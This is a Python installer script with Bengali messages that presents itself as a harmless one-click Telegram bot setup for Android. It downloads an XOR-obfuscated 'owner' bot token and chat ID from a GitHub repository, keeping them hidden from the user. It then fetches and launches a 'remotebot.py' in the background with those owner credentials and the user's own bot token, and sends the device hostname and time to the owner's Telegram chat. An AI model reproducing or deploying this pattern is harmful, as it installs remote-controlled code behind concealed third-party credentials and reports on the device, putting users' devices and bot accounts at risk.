#!/usr/bin/env python3
"""
╔══════════════════════════════════════════╗
║         AHM Bot One-Click Installer      ║
║  1. সব ফাইল download করবে               ║
║  2. Owner Bot auto load হবে              ║
║  3. User Bot token set করবেন            ║
║  4. দুটো bot একসাথে চালু হবে            ║
╚══════════════════════════════════════════╝
"""

import os, sys, json, base64, hashlib
import subprocess, datetime, socket

try:
    import requests as req
except ImportError:
    print("📦 requests install হচ্ছে...")
    subprocess.run([sys.executable, "-m", "pip", "install", "requests", "-q"])
    import requests as req

# ════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════

BASE     = "/storage/emulated/0"
CACHE    = os.path.join(BASE, ".botcache")
BOT_FILE = os.path.join(BASE, "remotebot.py")

OWNER_ENC_URL = "https://raw.githubusercontent.com/Arif91786/remotebot/main/.owner.enc"
OWNER_KEY_URL = "https://raw.githubusercontent.com/Arif91786/remotebot/main/.owner.key"
BOT_FILE_URL  = "https://raw.githubusercontent.com/Arif91786/remotebot/main/remotebot.py"

OWNER_ENC = os.path.join(CACHE, ".owner.enc")
OWNER_KEY = os.path.join(CACHE, ".owner.key")
USER_CONF = os.path.join(BASE, "user.config")

# ════════════════════════════════════════════
# Decrypt
# ════════════════════════════════════════════

def _d(enc, key):
    kb  = hashlib.sha256(key.encode()).digest()
    raw = base64.b64decode(enc.encode())
    return bytes([c ^ kb[i % len(kb)] for i, c in enumerate(raw)]).decode()

# ════════════════════════════════════════════
# Download
# ════════════════════════════════════════════

def download(url, path, label):
    try:
        print(f"  ⬇️  {label} ডাউনলোড হচ্ছে...")
        r = req.get(url, timeout=15)
        if r.status_code == 200:
            with open(path, "w") as f:
                f.write(r.text)
            print(f"  ✅ {label} সম্পন্ন!")
            return True
        else:
            print(f"  ❌ {label} ব্যর্থ! (Status: {r.status_code})")
            return False
    except Exception as e:
        print(f"  ❌ {label} error: {e}")
        return False

# ════════════════════════════════════════════
# Owner Config লোড
# ════════════════════════════════════════════

def load_owner():
    try:
        key  = base64.b64decode(open(OWNER_KEY).read().strip()).decode()
        data = json.loads(open(OWNER_ENC).read())
        return _d(data["t"], key), int(_d(data["c"], key))
    except Exception as e:
        print(f"  ❌ Owner config লোড error: {e}")
        return None, None

# ════════════════════════════════════════════
# User Config
# ════════════════════════════════════════════

def save_user(token, chat_id):
    with open(USER_CONF, "w") as f:
        json.dump({"bot_token": token, "chat_id": int(chat_id)}, f)

def load_user():
    try:
        data = json.load(open(USER_CONF))
        return data["bot_token"], int(data["chat_id"])
    except:
        return None, None

# ════════════════════════════════════════════
# Notification
# ════════════════════════════════════════════

def notify(token, chat_id, msg):
    try:
        req.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"},
            timeout=10
        )
    except:
        pass

# ════════════════════════════════════════════
# Main
# ════════════════════════════════════════════

def main():
    print("\n" + "=" * 44)
    print("   AHM Bot One-Click Installer")
    print("=" * 44)

    # Step 1: ফোল্ডার তৈরি
    os.makedirs(CACHE, exist_ok=True)
    print("\n📁 Step 1: ফোল্ডার তৈরি হচ্ছে... ✅")

    # Step 2: Download
    print("\n🌐 Step 2: GitHub থেকে ফাইল ডাউনলোড হচ্ছে...")
    enc_ok = download(OWNER_ENC_URL, OWNER_ENC, "Owner Config")
    key_ok = download(OWNER_KEY_URL, OWNER_KEY, "Owner Key")

    if not os.path.exists(BOT_FILE):
        download(BOT_FILE_URL, BOT_FILE, "remotebot.py")
    else:
        print("  ℹ️  remotebot.py আগে থেকে আছে, skip করা হলো।")

    if not enc_ok or not key_ok:
        print("\n❌ Owner config download হয়নি! Internet চেক করুন।")
        sys.exit(1)

    # Step 3: Owner লোড
    print("\n🔐 Step 3: Owner Bot লোড হচ্ছে...")
    o_token, o_chat = load_owner()
    if not o_token:
        print("❌ Owner Bot লোড হয়নি!")
        sys.exit(1)
    print("  ✅ Owner Bot সফলভাবে লোড হয়েছে!")

    # Step 4: User Bot setup
    print("\n👤 Step 4: User Bot Setup")
    print("-" * 44)
    u_token, u_chat = load_user()

    if u_token:
        print(f"  ℹ️  আগের User Bot পাওয়া গেছে: {u_token[:10]}***")
        change = input("  নতুন করে set করবেন? (y/n): ").strip().lower()
        if change == "y":
            u_token = None

    if not u_token:
        print("\n  📌 BotFather থেকে User Bot Token নিন")
        u_token = input("  🤖 User Bot TOKEN: ").strip()
        u_chat  = input("  💬 User Bot CHAT ID: ").strip()
        save_user(u_token, u_chat)
        u_chat = int(u_chat)
        print("  ✅ User Bot config সেভ হয়েছে!")

    # Step 5: Library চেক
    print("\n📦 Step 5: Library চেক হচ্ছে...")
    try:
        from telegram.ext import Application
        print("  ✅ python-telegram-bot আছে!")
    except ImportError:
        print("  ⬇️  python-telegram-bot install হচ্ছে...")
        subprocess.run([sys.executable, "-m", "pip", "install",
                       "python-telegram-bot==21.5", "-q"])
        print("  ✅ Install সম্পন্ন!")

    # Step 6: চালু করো
    print("\n🚀 Step 6: Bot চালু হচ্ছে...")
    print("=" * 44)
    print("  👑 Owner Bot : ✅ Encrypted & Active")
    print("  👤 User Bot  : ✅ Active")
    print("  🛑 বন্ধ করতে: pkill -f remotebot.py")
    print("=" * 44)

    now      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    hostname = socket.gethostname()

    notify(o_token, o_chat,
        f"🟢 <b>Bot চালু হয়েছে!</b>\n\n"
        f"🖥️ <b>Device:</b> {hostname}\n"
        f"🕐 <b>সময়:</b> {now}\n"
        f"🔐 <b>Owner:</b> Encrypted ✅\n"
        f"👤 <b>User Bot:</b> Active ✅"
    )

    notify(u_token, u_chat,
        f"🟢 <b>Bot চালু হয়েছে!</b>\n"
        f"🕐 <b>সময়:</b> {now}\n"
        f"✅ Ready — /start লিখুন"
    )

    env = os.environ.copy()
    env["OWNER_TOKEN"] = o_token
    env["OWNER_CHAT"]  = str(o_chat)
    env["USER_TOKEN"]  = u_token
    env["USER_CHAT"]   = str(u_chat)

    log = open(os.path.join(BASE, "bot.log"), "w")
    subprocess.Popen(
        [sys.executable, BOT_FILE],
        stdout=log, stderr=log,
        stdin=subprocess.DEVNULL,
        start_new_session=True,
        env=env
    )

    print("\n✅ Bot ব্যাকগ্রাউন্ডে চালু হয়েছে!")
    print(f"📄 Log: tail -f {BASE}/bot.log")
    print(f"🛑 বন্ধ: pkill -f remotebot.py")
    print("=" * 44)

if __name__ == "__main__":
    main()
